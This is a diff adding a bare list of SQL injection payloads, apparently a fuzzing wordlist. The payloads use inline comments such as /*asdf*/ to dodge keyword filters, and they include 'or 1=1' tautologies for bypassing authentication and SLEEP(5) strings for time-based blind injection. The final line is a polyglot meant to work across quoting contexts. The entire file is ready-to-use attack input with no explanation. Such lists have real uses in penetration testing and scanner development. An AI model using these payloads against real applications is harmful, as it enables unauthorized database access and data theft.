@@ -1,0 +1,19 @@
+' or/*asdf*/ 1/*asdf*/=1 --
+or 1/*asdf*/=1 --
+' or/*asdf*/ 1/*asdf*/=1 #
+or/*asdf*/ 1/*asdf*/=1 #
+' or/*asdf*/ '1/*asdf*/'/*asdf*/='1'--
+or/*asdf*/ 1/*asdf*/=1--
+' or/*asdf*/ 1/*asdf*/=1;#
+' or/*asdf*/ (EXISTS)
++SLE/*asdf*/EP(5)
++SLE/*asdf*/EP(5) --
++SLE/*asdf*/EP(5) /*
++SLE/*asdf*/EP(5) #
++SLE/*asdf*/EP(5);
+' OR/*asdf*/ SLE/*asdf*/EP(5)
+' OR/*asdf*/ SLE/*asdf*/EP(5) --
+' OR/*asdf*/ SLE/*asdf*/EP(5) /*
+' OR/*asdf*/ SLE/*asdf*/EP(5) #
+' OR/*asdf*/ SLE/*asdf*/EP(5);
+SLE/*asdf*/EP(5) /*' or/*asdf*/ SLE/*asdf*/EP(5) or/*asdf*/ '" or/*asdf*/ SLE/*asdf*/EP(5) or/*asdf*/ "*/
